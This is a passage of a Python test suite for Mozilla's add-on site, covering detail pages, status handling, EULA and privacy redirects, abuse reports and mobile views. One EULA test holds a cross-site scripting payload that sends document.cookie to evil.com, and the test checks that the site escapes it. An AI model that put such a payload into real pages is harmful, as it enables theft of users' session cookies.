        eq_(len(pq(res.content)('.backup-button')), 0)

    def test_backup(self):
        addon = Addon.objects.get(id=3615)
        addon._backup_version = addon.versions.all()[0]
        addon.save()
        url = reverse('addons.detail', args=[addon.slug])
        res = self.client.get(url)
        eq_(len(pq(res.content)('.backup-button')), 1)

    def test_disabled_user_message(self):
        addon = Addon.objects.get(id=3615)
        addon.update(disabled_by_user=True)
        url = reverse('addons.detail', args=[addon.slug])
        res = self.client.get(url)
        eq_(res.status_code, 404)
        assert 'removed by its author' in res.content

    def test_disabled_status_message(self):
        addon = Addon.objects.get(id=3615)
        addon.update(status=amo.STATUS_DISABLED)
        url = reverse('addons.detail', args=[addon.slug])
        res = self.client.get(url)
        eq_(res.status_code, 404)
        assert 'disabled by an administrator' in res.content

    @patch('addons.models.Addon.premium')
    def test_ready_to_buy(self, premium):
        addon = Addon.objects.get(id=3615)
        addon.update(premium_type=amo.ADDON_PREMIUM,
                     status=amo.STATUS_PUBLIC)
        addon.premium.get_price = '0.99'
        response = self.client.get(reverse('addons.detail', args=[addon.slug]))
        eq_(response.status_code, 200)

    def test_not_ready_to_buy(self):
        addon = Addon.objects.get(id=3615)
        addon.update(premium_type=amo.ADDON_PREMIUM,
                     status=amo.STATUS_NOMINATED)
        response = self.client.get(reverse('addons.detail', args=[addon.slug]))
        eq_(response.status_code, 200)
        eq_(len(pq(response.content)('.install a')), 0)

    def test_more_url(self):
        addon = Addon.objects.get(id=3615)
        response = self.client.get(reverse('addons.detail', args=[addon.slug]))
        eq_(pq(response.content)('#more-webpage').attr('data-more-url'),
            addon.get_url_path(more=True))


class TestImpalaDetailPage(amo.tests.TestCase):
    fixtures = ['addons/persona', 'base/apps', 'base/addon_3615',
                'base/addon_592', 'base/users']

    def setUp(self):
        self.addon = Addon.objects.get(id=3615)
        self.url = self.addon.get_url_path()
        self.more_url = self.addon.get_url_path(more=True)

        self.persona = Addon.objects.get(id=15663)
        self.persona_url = self.persona.get_url_path()

    def test_adu(self):
        doc = pq(self.client.get(self.url).content)
        eq_(doc('#daily-users').text().split()[0],
            numberfmt(self.addon.average_daily_users))

    def test_perf_warning(self):
        eq_(self.addon.ts_slowness, None)
        doc = pq(self.client.get(self.url).content)
        eq_(doc('.performance-note').length, 0)
        self.addon.update(ts_slowness=100)
        doc = pq(self.client.get(self.url).content)
        eq_(doc('.performance-note').length, 1)

    def test_dependencies(self):
        doc = pq(self.client.get(self.url).content)
        eq_(doc('.dependencies').length, 0)
        req = Addon.objects.get(id=592)
        AddonDependency.objects.create(addon=self.addon, dependent_addon=req)
        eq_(self.addon.all_dependencies, [req])
        cache.clear()
        d = pq(self.client.get(self.url).content)('.dependencies')
        eq_(d.length, 1)
        eq_(d.find('.hovercard h3').text(), unicode(req.name))
        eq_(d.find('.hovercard > a').attr('href')
            .endswith('?src=dp-dl-dependencies'), True)
        eq_(d.find('.hovercard .install-button a').attr('href')
            .endswith('?src=dp-hc-dependencies'), True)

    def test_upsell(self):
        doc = pq(self.client.get(self.url).content)
        eq_(doc('.upsell').length, 0)
        premie = Addon.objects.get(id=592)
        AddonUpsell.objects.create(free=self.addon, premium=premie, text='XXX')
        upsell = pq(self.client.get(self.url).content)('.upsell')
        eq_(upsell.length, 1)
        eq_(upsell.find('.prose').text(), 'XXX')
        eq_(upsell.find('.hovercard h3').text(), unicode(premie.name))
        eq_(upsell.find('.hovercard > a').attr('href')
            .endswith('?src=dp-dl-upsell'), True)
        eq_(upsell.find('.hovercard .install-button a').attr('href')
            .endswith('?src=dp-hc-upsell'), True)

    def test_no_restart(self):
        f = self.addon.current_version.all_files[0]
        eq_(f.no_restart, False)
        r = self.client.get(self.url)
        eq_(pq(r.content)('.no-restart').length, 0)
        f.update(no_restart=True)
        r = self.client.get(self.url)
        eq_(pq(r.content)('.no-restart').length, 1)

    def get_more_pq(self):
        return pq(self.client.get_ajax(self.more_url).content)

    def test_can_review_free(self):
        self.addon.update(premium_type=amo.ADDON_FREE)
        eq_(len(self.get_more_pq()('#add-review')), 1)

    def test_can_review_premium(self):
        self.client.login(username='regular@mozilla.com', password='password')
        self.addon.addonpurchase_set.create(user_id=999)
        self.addon.update(premium_type=amo.ADDON_PREMIUM)
        eq_(len(self.get_more_pq()('#add-review')), 1)

    def test_not_review_premium(self):
        self.addon.update(premium_type=amo.ADDON_PREMIUM)
        eq_(len(self.get_more_pq()('#add-review')), 0)

    def test_license_link_builtin(self):
        g = 'http://google.com'
        version = self.addon._current_version
        license = version.license
        license.builtin = 1
        license.name = 'License to Kill'
        license.url = g
        license.save()
        eq_(license.builtin, 1)
        eq_(license.url, g)
        r = self.client.get(self.url)
        a = pq(r.content)('.secondary.metadata .source-license a')
        eq_(a.attr('href'), g)
        eq_(a.attr('target'), '_blank')
        eq_(a.text(), 'License to Kill')

    def test_license_link_custom(self):
        version = self.addon._current_version
        eq_(version.license.url, None)
        r = self.client.get(self.url)
        a = pq(r.content)('.secondary.metadata .source-license a')
        eq_(a.attr('href'), version.license_url())
        eq_(a.attr('target'), None)
        eq_(a.text(), 'Custom License')

    def test_other_addons(self):
        """Ensure listed add-ons by the same author show up."""
        other = Addon.objects.get(id=592)
        eq_(list(Addon.objects.listed(amo.FIREFOX).exclude(id=self.addon.id)),
            [other])

        add_addon_author(other, self.addon)
        doc = self.get_more_pq()('#author-addons')
        test_hovercards(self, doc, [other], src='dp-dl-othersby')

    def test_other_personas(self):
        """Ensure listed personas by the same author show up."""
        addon_factory(type=amo.ADDON_PERSONA, status=amo.STATUS_NULL)
        addon_factory(type=amo.ADDON_PERSONA, status=amo.STATUS_LITE)
        addon_factory(type=amo.ADDON_PERSONA, disabled_by_user=True)

        other = addon_factory(type=amo.ADDON_PERSONA)
        other.persona.author = self.persona.persona.author
        other.persona.save()
        eq_(other.persona.author, self.persona.persona.author)
        eq_(other.status, amo.STATUS_PUBLIC)
        eq_(other.disabled_by_user, False)

        # TODO(cvan): Uncomment this once Personas detail page is impalacized.
        #doc = self.get_more_pq()('#author-addons')
        #test_hovercards(self, doc, [other], src='dp-dl-othersby')

        r = self.client.get(self.persona_url)
        eq_(list(r.context['author_personas']), [other])
        a = pq(r.content)('#more-artist a[data-browsertheme]')
        eq_(a.length, 1)
        eq_(a.attr('href'), other.get_url_path())

    def test_other_addons_no_webapps(self):
        """An app by the same author should not show up."""
        other = Addon.objects.get(id=592)
        other.update(type=amo.ADDON_WEBAPP)

        add_addon_author(other, self.addon)
        eq_(self.get_more_pq()('#author-addons').length, 0)

    def test_other_addons_no_unlisted(self):
        """An unlisted add-on by the same author should not show up."""
        other = Addon.objects.get(id=592)
        other.update(status=amo.STATUS_UNREVIEWED, disabled_by_user=True)

        add_addon_author(other, self.addon)
        eq_(self.get_more_pq()('#author-addons').length, 0)

    def test_other_addons_by_others(self):
        """Add-ons by different authors should not show up."""
        author = UserProfile.objects.get(pk=999)
        AddonUser.objects.create(addon=self.addon, user=author, listed=True)
        eq_(self.get_more_pq()('#author-addons').length, 0)

    def test_other_addons_none(self):
        eq_(self.get_more_pq()('#author-addons').length, 0)

    def test_author_watermarked(self):
        # TODO: remove when the marketplace is live.
        waffle.models.Switch.objects.create(name='marketplace', active=True)

        # Test that an author can get a watermarked addon.
        self.addon, self.price = setup_premium(self.addon)
        assert self.client.login(username=self.addon.authors.all()[0].email,
                                 password='password')
        res = self.client.get(self.url)
        eq_(pq(res.content)('aside .prominent').eq(1).attr('href'),
            reverse('downloads.latest', args=[self.addon.slug]))

    def test_not_author(self):
        waffle.models.Switch.objects.create(name='marketplace', active=True)

        # A non-author should not see the download link.
        self.addon, self.price = setup_premium(self.addon)
        assert self.client.login(username='regular@mozilla.com',
                                 password='password')
        res = self.client.get(self.url)
        eq_(len(pq(res.content)('.prominent')), 1)


class TestStatus(amo.tests.TestCase):
    fixtures = ['base/apps', 'base/addon_3615', 'addons/persona']

    def setUp(self):
        self.addon = Addon.objects.get(id=3615)
        self.version = self.addon.current_version
        assert self.addon.status == amo.STATUS_PUBLIC
        self.url = self.addon.get_url_path()

        self.persona = Addon.objects.get(id=15663)
        assert self.persona.status == amo.STATUS_PUBLIC
        self.persona_url = self.persona.get_url_path()

    def test_incomplete(self):
        self.addon.update(status=amo.STATUS_NULL)
        eq_(self.client.get(self.url).status_code, 404)

    def test_unreviewed(self):
        self.addon.update(status=amo.STATUS_UNREVIEWED)
        eq_(self.client.get(self.url).status_code, 200)

    def test_pending(self):
        self.addon.update(status=amo.STATUS_PENDING)
        eq_(self.client.get(self.url).status_code, 404)

    def test_nominated(self):
        self.addon.update(status=amo.STATUS_NOMINATED)
        eq_(self.client.get(self.url).status_code, 200)

    def test_public(self):
        self.addon.update(status=amo.STATUS_PUBLIC)
        eq_(self.client.get(self.url).status_code, 200)

    def test_disabled(self):
        self.addon.update(status=amo.STATUS_DISABLED)
        eq_(self.client.get(self.url).status_code, 404)

    def test_app_disabled(self):
        waffle.models.Flag.objects.create(name='accept-webapps', everyone=True)
        self.addon.update(type=amo.ADDON_WEBAPP, status=amo.STATUS_DISABLED)
        # Pull webapp back out for class override to take effect
        addon = Addon.objects.get(id=3615)
        eq_(self.client.head(addon.get_url_path()).status_code, 404)

    def test_lite(self):
        self.addon.update(status=amo.STATUS_LITE)
        eq_(self.client.get(self.url).status_code, 200)

    def test_lite_and_nominated(self):
        self.addon.update(status=amo.STATUS_LITE_AND_NOMINATED)
        eq_(self.client.get(self.url).status_code, 200)

    def test_purgatory(self):
        self.addon.update(status=amo.STATUS_PURGATORY)
        eq_(self.client.get(self.url).status_code, 200)

    def test_disabled_by_user(self):
        self.addon.update(disabled_by_user=True)
        eq_(self.client.get(self.url).status_code, 404)

    def test_app_disabled_by_user(self):
        waffle.models.Flag.objects.create(name='accept-webapps', everyone=True)
        self.addon.update(type=amo.ADDON_WEBAPP, disabled_by_user=True)
        # Pull webapp back out for class override to take effect
        addon = Addon.objects.get(id=3615)
        eq_(self.client.head(addon.get_url_path()).status_code, 404)

    def new_version(self, status):
        v = Version.objects.create(addon=self.addon)
        File.objects.create(version=v, status=status)
        return v

    def test_public_new_lite_version(self):
        self.new_version(amo.STATUS_LITE)
        eq_(self.addon.get_version(), self.version)

    def test_public_new_nominated_version(self):
        self.new_version(amo.STATUS_NOMINATED)
        eq_(self.addon.get_version(), self.version)

    def test_public_new_public_version(self):
        v = self.new_version(amo.STATUS_PUBLIC)
        eq_(self.addon.get_version(), v)

    def test_public_new_unreviewed_version(self):
        self.new_version(amo.STATUS_UNREVIEWED)
        eq_(self.addon.get_version(), self.version)

    def test_lite_new_unreviewed_version(self):
        self.addon.update(status=amo.STATUS_LITE)
        self.new_version(amo.STATUS_UNREVIEWED)
        eq_(self.addon.get_version(), self.version)

    def test_lite_new_lan_version(self):
        self.addon.update(status=amo.STATUS_LITE)
        v = self.new_version(amo.STATUS_LITE_AND_NOMINATED)
        eq_(self.addon.get_version(), v)

    def test_lite_new_lite_version(self):
        self.addon.update(status=amo.STATUS_LITE)
        v = self.new_version(amo.STATUS_LITE)
        eq_(self.addon.get_version(), v)

    def test_lite_new_full_version(self):
        self.addon.update(status=amo.STATUS_LITE)
        v = self.new_version(amo.STATUS_PUBLIC)
        eq_(self.addon.get_version(), v)

    def test_lan_new_lite_version(self):
        self.addon.update(status=amo.STATUS_LITE_AND_NOMINATED)
        v = self.new_version(amo.STATUS_LITE)
        eq_(self.addon.get_version(), v)

    def test_lan_new_full_version(self):
        self.addon.update(status=amo.STATUS_LITE_AND_NOMINATED)
        v = self.new_version(amo.STATUS_PUBLIC)
        eq_(self.addon.get_version(), v)

    def test_persona(self):
        for status in amo.STATUS_CHOICES.keys():
            self.persona.status = status
            self.persona.save()
            eq_(self.client.head(self.persona_url).status_code,
                200 if status == amo.STATUS_PUBLIC else 404)

    def test_persona_disabled(self):
        for status in amo.STATUS_CHOICES.keys():
            self.persona.status = status
            self.persona.disabled_by_user = True
            self.persona.save()
            eq_(self.client.head(self.persona_url).status_code, 404)


class TestTagsBox(amo.tests.TestCase):
    fixtures = ['base/addontag', 'base/apps']

    def test_tag_box(self):
        """Verify that we don't show duplicate tags."""
        r = self.client.get_ajax(reverse('addons.detail_more', args=[8680]),
                                 follow=True)
        doc = pq(r.content)
        eq_('SEO', doc('#tagbox ul').children().text())


class TestEulaPolicyRedirects(amo.tests.TestCase):

    def test_eula_legacy_url(self):
        """
        See that we get a 301 to the zamboni style URL
        """
        response = self.client.get('/en-US/firefox/addons/policy/0/592/42')
        eq_(response.status_code, 301)
        assert (response['Location'].find('/addon/592/eula/42') != -1)

    def test_policy_legacy_url(self):
        """
        See that we get a 301 to the zamboni style URL
        """
        response = self.client.get('/en-US/firefox/addons/policy/0/592/')
        eq_(response.status_code, 301)
        assert (response['Location'].find('/addon/592/privacy/') != -1)


class TestEula(amo.tests.TestCase):
    fixtures = ['addons/eula+contrib-addon', 'base/apps']

    def test_current_version(self):
        addon = Addon.objects.get(id=11730)
        r = self.client.get(reverse('addons.eula', args=[addon.slug]))
        eq_(r.context['version'], addon.current_version)

    def test_simple_html_is_rendered(self):
        addon = Addon.objects.get(id=11730)
        addon.eula = """
            <strong> what the hell..</strong>
            <ul>
                <li>papparapara</li>
                <li>todotodotodo</li>
            </ul>
            <ol>
                <a href="irc://irc.mozilla.org/firefox">firefox</a>

                Introduce yourself to the community, if you like!
                This text will appear publicly on your user info page.
                <li>papparapara2</li>
                <li>todotodotodo2</li>
            </ol>
            """
        addon.save()

        r = self.client.get(reverse('addons.eula', args=[addon.slug]))
        doc = pq(r.content)

        eq_(norm(doc(".policy-statement strong")),
            "<strong> what the hell..</strong>")
        eq_(norm(doc(".policy-statement ul")),
            "<ul><li>papparapara</li> <li>todotodotodo</li> </ul>")
        eq_(doc(".policy-statement ol a").text(),
            "firefox")
        eq_(norm(doc(".policy-statement ol li:first")),
            "<li>papparapara2</li>")

    def test_evil_html_is_not_rendered(self):
        addon = Addon.objects.get(id=11730)
        addon.eula = """
            <script type="text/javascript">
                window.location = 'http://evil.com/?c=' + document.cookie;
            </script>
            Muhuhahahahahahaha!
            """
        addon.save()

        r = self.client.get(reverse('addons.eula', args=[addon.slug]))
        doc = pq(r.content)

        policy = str(doc(".policy-statement"))
        assert policy.startswith(
                    '<div class="policy-statement">&lt;script'), (
                                            'Unexpected: %s' % policy[0:50])

    def test_old_version(self):
        addon = Addon.objects.get(id=11730)
        old = addon.versions.order_by('created')[0]
        assert old != addon.current_version
        r = self.client.get(reverse('addons.eula',
                                    args=[addon.slug, old.all_files[0].id]))
        eq_(r.context['version'], old)

    def test_redirect_no_eula(self):
        addon = Addon.objects.get(id=11730)
        addon.update(eula=None)
        r = self.client.get(reverse('addons.eula', args=['a11730']),
                            follow=True)
        self.assertRedirects(r, addon.get_url_path())


class TestPrivacyPolicy(amo.tests.TestCase):
    fixtures = ['addons/eula+contrib-addon', 'base/apps']

    def test_redirect_no_eula(self):
        Addon.objects.filter(id=11730).update(privacy_policy=None)
        r = self.client.get(reverse('addons.privacy', args=['a11730']),
                            follow=True)
        self.assertRedirects(r, reverse('addons.detail', args=['a11730']))


# When Embedded Payments support this, we can worry about it.
#def test_paypal_language_code():
#    def check(lc):
#        d = views.contribute_url_params('bz', 32, 'name', 'url')
#        eq_(d['lc'], lc)
#
#    check('US')
#
#    translation.activate('it')
#    check('IT')
#
#    translation.activate('ru-DE')
#    check('RU')


class TestAddonSharing(amo.tests.TestCase):
    fixtures = ['base/apps',
                'base/addon_3615']

    def test_redirect_sharing(self):
        addon = Addon.objects.get(id=3615)
        r = self.client.get(reverse('addons.share', args=['a3615']),
                            {'service': 'delicious'})
        url = absolutify(unicode(addon.get_url_path()))
        summary = truncate(addon.summary, length=250)
        eq_(r.status_code, 302)
        assert iri_to_uri(addon.name) in r['Location']
        assert iri_to_uri(url) in r['Location']
        assert iri_to_uri(summary) in r['Location']


class TestReportAbuse(amo.tests.TestCase):
    fixtures = ['addons/persona',
                'base/apps',
                'base/addon_3615',
                'base/users']

    def setUp(self):
        settings.RECAPTCHA_PRIVATE_KEY = 'something'
        self.full_page = reverse('addons.abuse', args=['a3615'])

    @patch('captcha.fields.ReCaptchaField.clean')
    def test_abuse_anonymous(self, clean):
        clean.return_value = ""
        self.client.post(self.full_page, {'text': 'spammy'})
        eq_(len(mail.outbox), 1)
        assert 'spammy' in mail.outbox[0].body
        report = AbuseReport.objects.get(addon=3615)
        eq_(report.message, 'spammy')
        eq_(report.reporter, None)

    def test_abuse_anonymous_fails(self):
        r = self.client.post(self.full_page, {'text': 'spammy'})
        assert 'recaptcha' in r.context['abuse_form'].errors

    def test_abuse_logged_in(self):
        self.client.login(username='regular@mozilla.com', password='password')
        self.client.post(self.full_page, {'text': 'spammy'})
        eq_(len(mail.outbox), 1)
        assert 'spammy' in mail.outbox[0].body
        report = AbuseReport.objects.get(addon=3615)
        eq_(report.message, 'spammy')
        eq_(report.reporter.email, 'regular@mozilla.com')

    def test_abuse_name(self):
        addon = Addon.objects.get(pk=3615)
        addon.name = 'Bmrk.ru Социальные закладки'
        addon.save()

        self.client.login(username='regular@mozilla.com', password='password')
        self.client.post(self.full_page, {'text': 'spammy'})
        assert 'spammy' in mail.outbox[0].body
        assert AbuseReport.objects.get(addon=addon)

    def test_abuse_persona(self):
        shared_url = reverse('addons.detail', args=['a15663'])
        r = self.client.get(shared_url)
        doc = pq(r.content)
        assert doc("fieldset.abuse")

        # and now just test it works
        self.client.login(username='regular@mozilla.com', password='password')
        r = self.client.post(reverse('addons.abuse', args=['a15663']),
                             {'text': 'spammy'})
        self.assertRedirects(r, shared_url)
        eq_(len(mail.outbox), 1)
        assert 'spammy' in mail.outbox[0].body
        assert AbuseReport.objects.get(addon=15663)

    def test_report_app_abuse(self):
        Addon.objects.get(slug='a15663').update(type=amo.ADDON_WEBAPP,
                                                app_slug='app-a15663')
        detail_url = reverse('apps.detail', args=['app-a15663'])
        res = self.client.get(detail_url)
        eq_(res.status_code, 200)
        doc = pq(res.content)
        eq_(doc('#abuse-modal form').attr('action'),
            reverse('apps.abuse', args=['app-a15663']))
        self.client.login(username='regular@mozilla.com', password='password')
        r = self.client.post(reverse('apps.abuse', args=['app-a15663']),
                             {'text': 'this app is porn'})
        self.assertRedirects(r, detail_url)


class TestMobile(amo.tests.MobileTest, amo.tests.TestCase):
    fixtures = ['addons/featured', 'base/apps', 'base/addon_3615',
                'base/featured', 'bandwagon/featured_collections']


class TestMobileHome(TestMobile):

    def _test_addons(self):
        r = self.client.get('/', follow=True)
        eq_(r.status_code, 200)
        app, lang = r.context['APP'], r.context['LANG']
        featured, popular = r.context['featured'], r.context['popular']
        eq_(len(featured), 3)
        assert all(a.is_featured(app, lang) for a in featured)
        eq_(len(popular), 3)
        eq_([a.id for a in popular],
            [a.id for a in sorted(popular, key=lambda x: x.average_daily_users,
                                  reverse=True)])

    @patch.object(settings, 'NEW_FEATURES', False)
    def test_addons(self):
        self._test_addons()

    @patch.object(settings, 'NEW_FEATURES', True)
    def test_new_addons(self):
        self._test_addons()


class TestMobileDetails(TestMobile):
    fixtures = TestMobile.fixtures + ['base/featured']

    def setUp(self):
        super(TestMobileDetails, self).setUp()
        self.ext = Addon.objects.get(id=3615)
        self.url = reverse('addons.detail', args=[self.ext.slug])

    def test_extension(self):
        r = self.client.get(self.url)
        eq_(r.status_code, 200)
        self.assertTemplateUsed(r, 'addons/mobile/details.html')

    def test_persona(self):
        persona = Addon.objects.get(id=15679)
        r = self.client.get(persona.get_url_path())
        eq_(r.status_code, 200)
        self.assertTemplateUsed(r, 'addons/mobile/persona_detail.html')
        assert 'review_form' not in r.context
        assert 'reviews' not in r.context
        assert 'get_replies' not in r.context

    def test_persona_mobile_url(self):
        r = self.client.get('/en-US/mobile/addon/15679/')
        eq_(r.status_code, 200)

    def test_extension_release_notes(self):
        r = self.client.get(self.url)
        relnotes = pq(r.content)('.versions li:first-child > a')
        assert relnotes.text().startswith(self.ext.current_version.version), (
            'Version number missing')
        version_url = self.ext.current_version.get_url_path()
        eq_(relnotes.attr('href'), version_url)
        self.client.get(version_url, follow=True)
        eq_(r.status_code, 200)

    def test_extension_adu(self):
        doc = pq(self.client.get(self.url).content)
        eq_(doc('.adu td').text(), numberfmt(self.ext.average_daily_users))

    def test_button_caching(self):
        """The button popups should be cached for a long time."""
        # Get the url from a real page so it includes the build id.
        client = test.Client()
        doc = pq(client.get('/', follow=True).content)
        js_url = reverse('addons.buttons.js')
        url_with_build = doc('script[src^="%s"]' % js_url).attr('src')

        response = client.get(url_with_build, follow=True)
        fmt = '%a, %d %b %Y %H:%M:%S GMT'
        expires = datetime.strptime(response['Expires'], fmt)
        assert (expires - datetime.now()).days >= 365

    def test_unicode_redirect(self):
        url = '/en-US/firefox/addon/2848?xx=\xc2\xbcwhscheck\xc2\xbe'
        response = test.Client().get(url)
        eq_(response.status_code, 301)
